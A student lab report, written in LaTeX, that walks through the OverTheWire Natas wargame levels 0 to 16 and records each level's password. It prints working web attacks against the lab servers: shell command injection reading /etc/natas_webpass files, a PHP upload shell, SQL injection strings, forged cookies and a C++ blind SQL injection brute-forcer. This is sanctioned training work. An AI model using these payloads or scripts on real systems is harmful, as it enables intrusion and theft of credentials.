\documentclass[11pt]{article}

\usepackage{graphicx}
\usepackage{framed}
\usepackage{hyperref}
\usepackage{xurl}
\usepackage{listings}
\usepackage{xcolor}
\usepackage{caption}
\usepackage{subcaption}

\usepackage{booktabs}
\usepackage{amsmath}

\marginparwidth 0.5in 
\oddsidemargin 0.25in 
\evensidemargin 0.25in 
\marginparsep 0.25in
\topmargin 0.25in 
\textwidth=6in
\textheight=8in

\definecolor{codegreen}{rgb}{0,0.6,0}
\definecolor{codegray}{rgb}{0.5,0.5,0.5}
\definecolor{codepurple}{rgb}{0.58,0,0.82}
\definecolor{backcolor}{rgb}{0.95,0.95,0.95}

% \lstset{
%   backgroundcolor=\color{backcolor}, % Set background color
%   commentstyle=\color{codegreen}, % Style for comments
%   keywordstyle=\color{magenta}, % Style for keywords
%   numberstyle=\tiny\color{codegray}, % Style for line numbers
%   stringstyle=\color{codepurple}, % Style for strings
%   basicstyle=\ttfamily\footnotesize, % Basic font style and size
%   breakatwhitespace=false, % Don't break lines at whitespace only
%   breaklines=true, % Enable line breaking
%   captionpos=b, % Caption position (bottom)
%   keepspaces=true, % Keep spaces
%   numbers=left, % Show line numbers on the left
%   numbersep=5pt, % Separation of numbers from code
%   showspaces=false, % Don't show spaces as visible characters
%   showstringspaces=false, % Don't show spaces in strings
%   showtabs=false, % Don't show tabs as visible characters
%   tabsize=2, % Tab size
%   xleftmargin=-5em,
%   framexleftmargin=-5em,
%   xrightmargin=0pt,
%   framexrightmargin=0pt,
%   linewidth=\dimexpr\textwidth+5em\relax,
% }
\usepackage{xcolor}
\usepackage{listings}
\usepackage{etoolbox}
\usepackage{changepage} % for adjustwidth

% ---------- one knob to control horizontal shift ----------
\newcommand*\ListingLeftShift{5em}

% Shift and widen every lstlisting (and file listings)
\BeforeBeginEnvironment{lstlisting}{%
  \begin{adjustwidth}{-\ListingLeftShift}{0pt}%
  \lstset{linewidth=\dimexpr\linewidth+\ListingLeftShift\relax}%
}
\AfterEndEnvironment{lstlisting}{%
  \end{adjustwidth}%
}
\pretocmd{\lstinputlisting}{%
  \begin{adjustwidth}{-\ListingLeftShift}{0pt}%
  \lstset{linewidth=\dimexpr\linewidth+\ListingLeftShift\relax}%
}{}{}
\apptocmd{\lstinputlisting}{\end{adjustwidth}}{}{}

% ---------- color definitions ----------
\definecolor{codegreen}{rgb}{0,0.6,0}
\definecolor{codegray}{rgb}{0.5,0.5,0.5}
\definecolor{codepurple}{rgb}{0.58,0,0.82}
\definecolor{backcolor}{rgb}{0.95,0.95,0.95}

% ---------- global listing style ----------
\lstset{
  backgroundcolor=\color{backcolor}, % grey background
  commentstyle=\color{codegreen},
  keywordstyle=\color{magenta},
  numberstyle=\tiny\color{codegray},
  stringstyle=\color{codepurple},
  basicstyle=\ttfamily\footnotesize,
  breaklines=true,
  captionpos=b,
  keepspaces=true,
  numbers=left,
  numbersep=5pt,
  showspaces=false,
  showstringspaces=false,
  showtabs=false,
  tabsize=2,
  frame=single,
  rulecolor=\color{backcolor},
  framesep=2pt,
  xleftmargin=0pt,
  xrightmargin=0pt,
  framexleftmargin=0pt,
  framexrightmargin=0pt
}
\begin{document}
\hfill\vbox{\hbox{Jude Shin, Torrey Zachs}
		\hbox{CSC 321, Section 07}	
		\hbox{Module 8}	
		\hbox{\today}}\par

\bigskip
\centerline{\Large\bf Lab 8: OverTheWire Natas CTF}\par
\bigskip

This lab completes the OverTheWire CTF: Natas through level 16. A link to the game can be found \href{https://overthewire.org/wargames/natas/}{here}.

% ============================================================================

\section*{Commands, Passwords and Walk-through}
\subsection*{Level 0}
Password: 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq

Unlike other ctfs, this one is located on a website. 

The first login is from \href{http://natas0.natas.labs.overthewire.org}{http://natas0.natas.labs.overthewire.org}. Logging in with the default credentials on the popup as Username: natas0 and Password: natas0. 

When inspecting the javascript in the page, there was a comment in the main source code noting the password for the next level. 

\begin{lstlisting}
<!--The password for natas1 is 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq -->
\end{lstlisting}

\subsection*{Level 1}
Password: TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI

The login is from \href{http://natas1.natas.labs.overthewire.org}{http://natas1.natas.labs.overthewire.org}. I logged in with the previously found credentials. 

I used the same exact technique as level 0. \texttt{ctrl+shift+i} to inspect the page, and then the password was found at the bottom of the source code. 

\begin{lstlisting}
<!--The password for natas2 is TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI -->
\end{lstlisting}

\subsection*{Level 2}
Password: 3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH

The login is from \href{http://natas2.natas.labs.overthewire.org}{http://natas2.natas.labs.overthewire.org}. I logged in with the previously found credentials. 

At first I thought that the pixel.png had something to do with it. Because it was so small I thought that there might be some text embedded in the image if I opened it in a utf-8 buffer, but it did not show anything important. 

The url that the file was located at (\lstinline{http://natas2.natas.labs.overthewire.org/files/pixel.png}) also showed that there was a directory called \lstinline{files}. Going to that url (\lstinline{http://natas2.natas.labs.overthewire.org/files/}) sent me to a website that also had a directory with a file called \lstinline{users.txt}. These lines were the contents of the file. 

\begin{lstlisting}
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
eve:zo4mJWyNj2
mallory:9urtcpzBmH
\end{lstlisting}

It clearly lays out the password for the \lstinline{natas3}.

\subsection*{Level 3}
Password: QryZXc2e0zahULdHrtHxzyYkj59kUxLQ

The login is from \href{http://natas3.natas.labs.overthewire.org}{http://natas3.natas.labs.overthewire.org}. I logged in with the previously found credentials. 

I looked at the hints, and it says that "Not even Google can find it" is a reference to a file robots.txt that gives parameters on what search engines are and aren't allowed to crawl through. I tried to append that filename to the end of the url (giving me \lstinline{http://natas3.natas.labs.overthewire.org/robots.txt}) and found the following contents:

\begin{lstlisting}
User-agent: *
Disallow: /s3cr3t/
\end{lstlisting}

I assumed that the directory \lstinline{/s3cr3t/} was actually present (if they were trying to disallow it), so I went to the url \lstinline{http://natas3.natas.labs.overthewire.org/s3cr3t} and there was yet another \lstinline{users.txt} with the following contents.

\begin{lstlisting}
natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
\end{lstlisting}

\subsection*{Level 4}
Password: 0n35PkggAPm2zbEpOU802c0x0Msn1ToK

The login is from \href{http://natas4.natas.labs.overthewire.org}{http://natas4.natas.labs.overthewire.org}. I logged in with the previously found credentials. 

This time, I opened up BurpSuite, which allowed me to intercept all traffic going in and out using a proxy. This meant that when sending a page, I can edit the contents before sending it out. In this case, when we clicked the \lstinline{refresh page}, button, it would give a message like the following:. 

\begin{lstlisting}
Access disallowed. You are visiting from "http://natas4.natas.labs.overthewire.org/index.php" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
\end{lstlisting}
<
When I intercepted the traffic of the refresh GET request, I saw that the bottom of the request had a \lstinline{Referer} section. I set this to be \lstinline{http://natas5.natas.labs.overthewire.org/}. 

\begin{lstlisting}
GET /index.php HTTP/1.1
Host: natas4.natas.labs.overthewire.org
Authorization: Basic bmF0YXM0OlFyeVpYYzJlMHphaFVMZEhydEh4enlZa2o1OWtVeExR
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://natas4.natas.labs.overthewire.org/index.php
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
\end{lstlisting}

I forwarded the edited request, and this was the result:

\begin{lstlisting}
Access granted. The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
\end{lstlisting}

\subsection*{Level 5}
Password: 0RoJwHdSKWFTYR5WuiAewauSuNaBXned

The login is from \href{http://natas5.natas.labs.overthewire.org}{http://natas5.natas.labs.overthewire.org}. I logged in with the previously found credentials. 

I again opened up BurpSuite, which allowed me to intercept all traffic going in and out using a proxy. This meant that when sending a page, I can edit the contents before sending it out. In this case, when I logged in, I was greeted with a message that I was not logged in. This did not make any sense, as I just used the correct credentials. I refreshed the page and looked at the contents of the request. This is what I found (note the attribute at the bottom that says \lstinline{loggedin})

\begin{lstlisting}
GET / HTTP/1.1
Host: natas5.natas.labs.overthewire.org
Cache-Control: max-age=0
Authorization: Basic bmF0YXM1OjBuMzVQa2dnQVBtMnpiRXBPVTgwMmMweDBNc24xVG9L
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: loggedin=0
Connection: keep-alive
\end{lstlisting}

I changed the \lstinline{Cookie: loggedin=0} to \lstinline{Cookie: loggedin=1}, and forwarded the request. The new password page with the credentials are now shown. In response to this.

\begin{lstlisting}
Access granted. The password for natas6 is 0RoJwHdSKWFTYR5WuiAewauSuNaBXned
\end{lstlisting}

\subsection*{Level 6}
Password: bmg8SvU1LizuWjx3y7xkNERkHxGre0GS

The login is from \href{http://natas6.natas.labs.overthewire.org}{http://natas6.natas.labs.overthewire.org}. I logged in with the previously found credentials. 

There was a button that showed the source code of what looked to be the webpage. It had this interesting stream of logic in the middle of it:

\begin{lstlisting}
<?

include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>
\end{lstlisting}

I think that if I am able to insert a key-value pair of "secret" and "whatever", into some hash-table, then I would be able to use that to print the table. I think that there might be some dependencies in secret.inc, so I am going to go looking for that. 

But honestly, the import probably has some interesting contents. Lets construct a new url that tries to access this file (\lstinline{http://natas6.natas.labs.overthewire.org/includes/secret.inc}). This is the following contents of that page:

\begin{lstlisting}
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
\end{lstlisting}

I am going to try and use the \lstinline{FOEIUWGHFEEUHOFUOIU} as the password on the main page and see if it gives me anything else. Yay! It worked! Here is the message that it displayed to me:

\begin{lstlisting}
Access granted. The password for natas7 is bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
\end{lstlisting}

\subsection*{Level 7}
Password: xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q

The login is from \href{http://natas7.natas.labs.overthewire.org}{http://natas7.natas.labs.overthewire.org}. I logged in with the previously found credentials. 

There seems to be a \lstinline{home} and \lstinline{about} page. I am going to visit both of them. The urls for them end up being \lstinline{http://natas7.natas.labs.overthewire.org/index.php?page=home} and \lstinline{http://natas7.natas.labs.overthewire.org/index.php?page=about} respectively.

When inspecting the page, I stumble across this comment in the html: \lstinline{<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->}. I am going to try and construct a new url, that might access this said file-path. Lets try \lstinline{http://natas7.natas.labs.overthewire.org/etc/natas_webpass/natas8}. This did not work. What if I try to use the url \lstinline{http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8}. This produced a page with the following contents (I assume the string is the password to the next one):

\begin{lstlisting}
Home About

xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
\end{lstlisting}

\subsection*{Level 8}
Password: ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t

The login is from \href{http://natas8.natas.labs.overthewire.org}{http://natas8.natas.labs.overthewire.org}. I logged in with the previously found credentials. 

Like level 6, there was a prompt that took an input string, submitted the string, and would (hopefully) give me the password to the next level. I took a look at the source code, and found the following chunk of code:

\begin{lstlisting}
<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
\end{lstlisting}

I think if I can get the submitted password to be the encodedSecret, then the request will pass, and I will get the password to the next level. I am going to have to first base64\_decode the secret, then reverse the string, and then finally convert it from hex to binary. To do this, I wrote a small python script:

\begin{lstlisting}
import base64

ENCODED_SECRET = "3d3d516343746d4d6d6c315669563362"

def reverse_engineer(encoded):
    reversed_b64_bytes = bytes.fromhex(encoded)
    reversed_b64_str = reversed_b64_bytes.decode()[::-1]
    original_bytes = base64.b64decode(reversed_b64_str)
    return original_bytes.decode()

print(decode_secret(ENCODED_SECRET))
\end{lstlisting}

The output of my little helper function was the string "\lstinline{oubWYf2kBq}". After trying this as the password, the access was granted and I was given the page with this as the contents

\begin{lstlisting}
Access granted. The password for natas9 is ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
\end{lstlisting}

\subsection*{Level 9}

I see in the source code below that it puts the value I input, \texttt{key}, directly into the
\texttt{passthru} statement, which is executing the \texttt{grep} command.

\begin{lstlisting}
<?php
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
\end{lstlisting}

I can terminate the grep command early with a semicolon, and then execute any command I want,
followed by \verb|#| to comment out the \texttt{dictionary.txt} string.

So, I input: \verb|; ls #|

This outputs:
\begin{lstlisting}
dictionary.txt
index-source.html
index.php
\end{lstlisting}

This isn't very useful.

Instead, I try \verb|ls /| to see the root directory. There is an \texttt{etc} directory. 
From bandit, normally passwords are stored here. Then, with

\verb|; ls /etc/natas_webpass| \\
\verb|; cat /etc/natas_webpass/natas10 #|

I retrieve the password.

Password: \texttt{t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu}

\subsection*{Level 10}

\begin{verbatim}
The only difference between this level and
the last one is a small blacklist:
\end{verbatim}

\begin{verbatim}
if(preg_match('/[;|&]/',$key)) {
\end{verbatim}

Instead, I now just use this input:

\begin{verbatim}
'' /etc/natas_webpass/natas11 #
\end{verbatim}

The '' passes any empty match parameter to grep, so grep will print the entire file.  
I then insert the file I want to print, and use the same \# to ignore the rest of the line.

Password: \texttt{UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk}

\subsection*{Level 11}

The main code that matters in this level is:
\begin{lstlisting}
$data = loadData($defaultdata);
saveData($data);
\end{lstlisting}

where loadData encodes a cookie with
\begin{lstlisting}
json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
\end{lstlisting}

and saveData sets the cookie with
\begin{lstlisting}
setcookie("data", base64_encode(xor_encrypt(json_encode($data))));
\end{lstlisting}

looking at the xor\_encrypt function, the two thing we need for the encryption are
the passed in value (the Cookie), and the key, which is censored, and we dont have It.

\begin{lstlisting}
function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
        $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}
\end{lstlisting}

This encryption performs input\^key = Cookie.  
However, since the xor operation is symmetric, we can also do:  
Cookie\^input = key

Here, the input is the raw data from the Cookie struct, which looks like this:

\begin{lstlisting}
$defaultdata = array( "showpassword"=>"yes", "bgcolor"=>"#ffffff");
\end{lstlisting}

\begin{verbatim}
We can see what the current $_COOKIE of the site is by 
typing into the browser console:
document.cookie, which gives, among other things:
\end{verbatim}

\begin{lstlisting}
data = HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GcmBZUnJgTRg%3D
\end{lstlisting}

So, we can use their same encryption algorithm, 
\begin{verbatim}
where Cookie = HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GcmBZUnJgTRg  
\end{verbatim}
and our input is their default data.  
I use the below script to generate their key using the same xor\_encrypt function.

\begin{lstlisting}
<?php
$key = json_encode(array( "showpassword"=>"yes", "bgcolor"=>"#ffffff"));
$text = base64_decode("HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GcmBZUnJgTRg=");
$outText = '';

// Iterate through each character
for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
}
echo $outText;
?>
\end{lstlisting}

This outputs eDWoeDWoeDWoeDWoeS:  
So, the key is the repeating part, eDWo, since we iterate over the length of the input (our cookie),  
which is longer than the key here.

Now that we have the key, we can generate our own cookie that will set showpassword to "yes".  
I use the below script to generate the correct cookie, using their same xor\_encrypt function:

\begin{lstlisting}
<?php
function xor_encrypt($in) {
    $key = 'eDWo';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
        $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}
$defaultdata = array( "showpassword"=>"yes", "bgcolor"=>"#676767");
echo "\n";
echo base64_encode(xor_encrypt(json_encode($defaultdata)));
?>
\end{lstlisting}

This generates:  \\
HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZ2FYU3NhWEc5  

I then set this as the cookie in my browser by using  \\
\texttt{document.cookie="data=HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZ2FYU3NhWEc5"}  

Then, when I reload the page, it will use the cookie I just set, and it decodes that cookie to get the data array with showpassword set to "yes",  
which executes the line to show me the password for the next level.  

Password: \texttt{yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB}

\subsection*{Level 12}

I observe in the code for this level that it requires that the file I upload is a .jpg on the browser side,  
so I uploaded this file as a jpg in their webpage:

\begin{lstlisting}
<?php
$filename = '/etc/natas_webpass/natas13';

if (file_exists($filename)) {
    // Read the file and output its contents
    echo nl2br(htmlspecialchars(file_get_contents($filename)));
} else {
    echo "File not found.";
}
?>
\end{lstlisting}

This is a php file that will echo the contents of the password file for natas13 (using getfilecontents).  
To make this file interpreted as php by the server, I modify the message being sent to the server to be:  
using burpsuite, replacing the name of the file printPW.jpg → printPw.php.  
After I send the message in burp suite, the web page displays the password.  

Password: \texttt{trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC}

\subsection*{Level 13}

They say for security reasons, they now only accept image files.  
Level 12→13 method gets rejected now.  
I’m guessing this just means they are checking the header of the file.  

This time, I upload an actual jpg file.  
The jpg file is only a 1x1 white pixel. On burp suite, this is what is queued to be sent:

\begin{lstlisting}
4r1zgqson0.jpg
------WebKitFormBoundaryH5RSG5Atp6sbji9B
Content-Disposition: form-data; name="uploadedfile"; filename="smallest.jpg"
Content-Type: 
<complete Junk>
------WebKitFormBoundaryH5RSG5Atp6sbji9B--
\end{lstlisting}

I replace all jpg with php now, but leave what I would guess to be the file header (the first few bytes) unchanged.  
I then place the same php code as before in the body of the file.  
The text I forward is:

\begin{lstlisting}
------WebKitFormBoundaryU8x8Gvgi4a8priMU
Content-Disposition: form-data; name="filename"

4r1zgqson0.php
------WebKitFormBoundaryU8x8Gvgi4a8priMU
Content-Disposition: form-data; name="uploadedfile"; filename="smallest.php"
Content-Type: application/x-php
<complete Junk>
<?php
$filename = '/etc/natas_webpass/natas14';

if (file_exists($filename)) {
    // Read the file and output its contents
    echo nl2br(htmlspecialchars(file_get_contents($filename)));
} else {
    echo "File not found.";
}
?>
<complete Junk>
------WebKitFormBoundaryU8x8Gvgi4a8priMU--
\end{lstlisting}

The output text won’t format nicely here, but the password is there:  \\
Password: \texttt{z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ}

\subsection*{Level 14}

This uses an SQL query and selects all users with matching username and password.  
In the code, they select with:

\begin{lstlisting}
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
\end{lstlisting}

I put as my username:  
\texttt{" or true; --}  

this makes the query look like:

\begin{lstlisting}
$query = "SELECT * from users where username=\"\" or true; -- ... <comments ignored>;
\end{lstlisting}

So, it selects all users in the database. Since this selects more than 0 rows, it passes the if statement and prints the password.  

Password: \texttt{SdqIqBsFcz3yotlNYErZSZwblkm0lrvx}

\subsection*{Level 15}

This problem has the problematic lines:

\begin{lstlisting}
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
$res = mysql_query($query, $link);
if($res) {
    if(mysql_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
} else {
    echo "Error in query.<br>";
}
\end{lstlisting}
They directly insert our query string into query. 
For this problem, if we give a string of the form: 
\begin{lstlisting}
username=natas16 " AND BINARY substring(password,1,1) = 'a' --
\end{lstlisting}
then the query becomes:
\begin{lstlisting}
SELECT * from users where username=natas16 " AND BINARY substring(password,1,1) = 'a' -- "
\end{lstlisting}

The -- comments out the last quote, so the query is valid.  
We check easily that a user natas16 exists, by just sending natas16, and assume that the password for user natas16 will correspond to the password for the next level.  
We are injecting the additional condition that the first character of the password is 'a'.  
If the response is "This user exists", then we know that the first character is 'a'.  
If the response is "This user doesn't exist", then we know that the first character is not 'a'.  
We can repeat this process over every possible character for every slot of the password until we have the full password.

I wrote a C++ program that will do this automatically. The large strings from the HTTP requests were taken by looking at what a normal request looks like by using their GUI and viewing the staged message in burp suite.

\begin{lstlisting}
#include <iostream>
#include <string>
#include <cstring>
#include <unistd.h>
#include <arpa/inet.h>
#include <netdb.h>


const std::string top_header = 
    "POST /index.php HTTP/1.1\r\n"
    "Host: natas15.natas.labs.overthewire.org\r\n"
    "Content-Length: ";

//need to insert content length between top_header and request_main

const std::string bottom_header ="\r\n"
    "Cache-Control: max-age=0\r\n"
    "Authorization: Basic bmF0YXMxNTpTZHFJcUJzRmN6M3lvdGxOWUVyWlNad2Jsa20wbHJ2eA"
    "==\r\nAccept-Language: en-US,en;q=0.9\r\n"
    "Origin: http://natas15.natas.labs.overthewire.org\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Upgrade-Insecure-Requests: 1\r\n"
    "User-Agent: Mozilla/5.0 (X11; Linux x86_64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36\r\n"
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,"
    "image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n"
    "Referer: http://natas15.natas.labs.overthewire.org/\r\n"
    "Accept-Encoding: identity\r\n"
    "Connection: keep-alive\r\n"    
    "\r\n";                      

    
const std::string request_value_base =
    "username=natas16"
    "\" AND BINARY substring(password,1,";
    //raw string for gui testing:
    //username=natas16 " AND BINARY substring(password,1,1) = 'a' -- 

    const std::string host = "natas15.natas.labs.overthewire.org";
    constexpr int port = 80; 

typedef enum matchResult {
    NO_MATCH,
    MATCH,
    Connection_Error
} matchResult;

int createConnection();
void findPassword(int sock);
matchResult checkPW_Match(int sock, std::string& request_value);

int main() {
    FILE *fp = freopen("password_res.txt", "w", stdout);
    if (fp == NULL) {
        perror("freopen failed");
        return 1;
    }

    //Connect
    int sock;
    if ( (sock = createConnection()) < 0) {
        std::cout << "Failed to create connection. Exiting.\n";
        exit(1);
    }
    findPassword(sock);

}

int createConnection() {
    hostent* server = gethostbyname(host.c_str());
    if (!server) {
        std::cerr << "Host not found.\n";
        return -1;
    }

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("socket");
        return -1;
    }
    sockaddr_in serv_addr{};
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);
    std::memcpy(&serv_addr.sin_addr.s_addr, server->h_addr, server->h_length);

    struct timeval tv;
    tv.tv_sec  = 2;  // 2.5 s timeout
    tv.tv_usec = 500000; 

    if (setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv)) < 0) {
        perror("setsockopt(SO_RCVTIMEO)");
    }
    if (connect(sock, (sockaddr*)&serv_addr, sizeof(serv_addr)) < 0) {
        perror("connect");
        close(sock);
        return -1;
    }
    return sock;
}

//Construct password one character at a time
void findPassword(int sock) {
    std::string password= "";  
    while(password.length() < 64) { //password shouldn't be too long
        constexpr char endChar = 'z';
        for (char nextChar = '0'; nextChar <= endChar; nextChar++){
            if(!std::isalnum(nextChar)){
                continue;
            }

            std::string request_value = request_value_base + std::to_string(password.length() + 1) + ")"
                " = '" + password + nextChar + "' #";
            matchResult res = checkPW_Match(sock, request_value);

            if(res == MATCH){
                password += nextChar;
                std::cout << "Found so far: " << password << "\n";
                break;  //continue to next string position

            } else if (res == Connection_Error){
                std::cout << "Connection error occurred. Will attempt to reconnect.\n";
                close(sock);
                if ( (sock = createConnection()) < 0) {
                    std::cout << "Failed to create connection. Exiting.\n";
                    exit(1);
                }
                nextChar--; //try again with new connection
                continue;   

            } else if (res == NO_MATCH && nextChar == endChar){
                std::cout << "No more matching characters found. Password is: " << password << "\n";
                close(sock);
                exit(0);
            }
        }

    }
    std::cout<<"pw too long, something is wrong..\n";
    exit(1);
}

//send the request to natas15 and check response for match or no match.
matchResult checkPW_Match(int sock, std::string& request_value) {

    //Send request
    std::string full_request = top_header + std::to_string(request_value.length()) + bottom_header + request_value;
    ssize_t sent = send(sock, full_request.c_str(), full_request.length(), 0);
    if (sent < 0) {
        std::cout<<"send error\n";
        close(sock);
        return Connection_Error;
    }

    // Recv response
    char buffer[4096];
    std::string response={0};
    ssize_t bytes;
    while ((bytes = recv(sock, buffer, sizeof(buffer) - 1, 0)) > 0) {
        buffer[bytes] = '\0';
        response += buffer;
        if(response.find("This user exists") != std::string::npos) {
            std::cout << request_value << "exists!\n";

            return matchResult::MATCH;
        } else if (response.find("This user doesn't exist") != std::string::npos) {
            return matchResult::NO_MATCH;
        }
    }

    //We didn't find the match or no match text
    std::cout << "message timeout or invalid\n";
    std::cout<< "Full request was:\n" << full_request << "\n";
    std::cout << "Full response:\n" << response << "\n";
    return Connection_Error;
}

\end{lstlisting}

The above cpp program used the corresponding Makefile:

\begin{lstlisting}
CXX      := g++
CXXFLAGS := -std=c++17 -Wall -O2

TARGET := client
SRC    := main.cpp

all: $(TARGET)

$(TARGET): $(SRC)
	$(CXX) $(CXXFLAGS) $(CURL_CFLAGS) -o $@ $^ $(CURL_LIBS)

run: $(TARGET)
	./$(TARGET)

clean:
	rm -f $(TARGET)
\end{lstlisting}

The last line of my C program output was:  
No more matching characters found. Password is: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo  

Password: \texttt{hPkjKYviLQctEW33QmuXL6eDVfMW4sGo}

\subsection*{Level 16}

This problem has the problematic line:

\begin{lstlisting}
if(preg_match('/[;|&`\'"]/',$key)) {
    print "Input contains an illegal character!";
} else {
    passthru("grep -i \"$key\" dictionary.txt");
}
\end{lstlisting}

In this problem, they attempt to filter 
out characters that would allow command injection.  
However, blacklisting is not a secure way to filter input,
and we can still command inject by submitting a string of the form:  
\begin{lstlisting}
$(grep ^<pw> /etc/natas_webpass/natas17)cringe
\end{lstlisting}
where pw is our guess at the password.

\begin{verbatim}
The key issue is that we can inject subcommands using $(),
which is not blacklisted. Our command inside $() greps
the natas17 file for a line starting with pw.
The ^ forces the line to start with our password,
so we aren't just matching any substring.
If our guess matches the start of the password,
the subcommand will output the password,
\end{verbatim}

\begin{verbatim}
However, we don't have a way of viewing the password directly,
 instead, we append "cringe" to the end of the subcommand output,
  and look up the word in the dictionary.
If our guess is correct, the full output will be "<password>cringe",
 which doesn't exist in the dictionary.txt file,
  so we will get a response with no words.
If our guess is incorrect, the output will be "cringe",
 which does exist in the dictionary.txt file,
  so we will get a response with the word "cringe".
I use almost the exact same Cpp program as level 15,
 except with modification to the String being sent,
  and how the response is interpreted.
For brevity, below I only provide the logic for sending the request,
 and interpreting the response.
\end{verbatim}

\begin{lstlisting}
//message top should appear like:
//GET /?needle=%24%28grep+%5Epw+%2Fetc%2Fnatas_webpass%2Fnatas17%29cringe
// where pw is the password we are guessing. The ^ makes it so that it only matches at the start of the line
const std::string messageBottom =
    "&submit=Search HTTP/1.1\r\n"
    "Host: natas16.natas.labs.overthewire.org\r\n"
    "Authorization: Basic bmF0YXMxNjpoUGtqS1l2aUxRY3RFVzMzUW11WEw2ZURWZk1XNHNHbw==\r\n"
    "Accept-Language: en-US,en;q=0.9\r\n"
    "Upgrade-Insecure-Requests: 1\r\n"
    "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36\r\n"
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n"
    "Referer: http://natas16.natas.labs.overthewire.org/\r\n"
    "Accept-Encoding: identity\r\n"
    "Connection: keep-alive\r\n\r\n" ;

    //inside main, part for formatting request:
    std::string request_value = "GET /?needle=%24%28grep+%5E"
            + password + nextChar + "+%2Fetc%2Fnatas_webpass%2Fnatas17%29cringe";
    matchResult res = checkPW_Match(sock, request_value);

    //inside checkPW_Match, part for interpreting response:
    while ((bytes = recv(sock, buffer, sizeof(buffer) - 1, 0)) > 0) {
        buffer[bytes] = '\0';
        response += buffer;
        if(response.find("cringe") != std::string::npos) {
            std::cout << request_value << " does not exist.\n";
            return matchResult::NO_MATCH;   // our password was not concatenated with cringe, it did not match
        } else if (response.find("</pre>") != std::string::npos) {  // end of output block
            std::cout << request_value << " exists!\n";
            return matchResult::MATCH;  // our password was concatenated with cringe, so it matched
        }
    }
\end{lstlisting}

The last line of my Cpp program output was:  
\begin{lstlisting}
No more matching characters found. Password is: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC  
\end{lstlisting}

